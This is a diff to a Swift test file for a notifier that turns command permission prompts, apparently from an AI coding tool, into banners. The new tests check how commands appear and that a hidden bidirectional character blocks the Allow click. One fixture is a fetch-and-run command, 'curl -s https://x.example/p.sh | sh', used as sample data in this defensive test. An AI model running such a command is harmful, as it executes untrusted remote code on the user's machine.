@@ -66,6 +66,7 @@ final class TestHost: NotifierHost {
     s.features = true
     s.sessions = [SessionRow(id: "stub-a", name: "Stub A", state: "waiting")]
     s.names = ["stub-a": "Stub A"]
+    s.sessionsComplete = true
     return s
   }()
   var windowShowingSession: String?
@@ -272,6 +273,22 @@ func runAll() {
     poster.posts.last?.title ?? "")
   check("the follow-up has no actions", poster.posts.last?.category == "INFO")
 
+  // Today's Bash prompt shape: the command is in description. The banner
+  // shows it, and an unsafe character there stops Allow at the click.
+  stub("prompt=current")
+  notifier.consider([entry("needsYou")], prompts: [id: background { Backend.prompt(id) }!])
+  check("current shape: the body shows the command",
+    poster.posts.last?.body.contains("curl -s https://x.example/p.sh | sh") == true, poster.posts.last?.body ?? "")
+  check("current shape: PERMISSION", poster.posts.last?.category == "PERMISSION", poster.posts.last?.category ?? "")
+  stub("prompt=currentbidi&clear=1")
+  respond("allow", nonce: Notifier.posted["s-stub-a"]?.nonce)
+  check("bidi in the description at the click sends nothing",
+    !appRequests().contains { ($0["method"] as? String) == "POST" }, json(appRequests()))
+  stub("prompt=currentbidi")
+  notifier.consider([entry("needsYou")], prompts: [id: background { Backend.prompt(id) }!])
+  check("bidi in the description: not PERMISSION", poster.posts.last?.category != "PERMISSION",
+    poster.posts.last?.category ?? "")
+
   // A wrong nonce: no request at all
   stub("prompt=v1")
   notifier.consider([entry("needsYou")], prompts: [id: background { Backend.prompt(id) }!])
@@ -337,6 +354,13 @@ func runAll() {
   host.appIsActive = false
   notifier.consider([entry("needsYou")], prompts: [id: background { Backend.prompt(id) }!])
   check("posted again", Notifier.posted["s-stub-a"]?.kind == "needsYou")
+  // A poll that didn't read the sessions (a restart, a status timeout) has
+  // none: the post stays
+  var partial = host.snapshot
+  partial.sessions = []
+  partial.sessionsComplete = false
+  notifier.reconcile(partial, details: [:])
+  check("a partial poll keeps the post", Notifier.posted["s-stub-a"]?.kind == "needsYou")
   var idle = host.snapshot
   idle.sessions = [SessionRow(id: id, name: "Stub A", state: "idle")]
   host.snapshot = idle
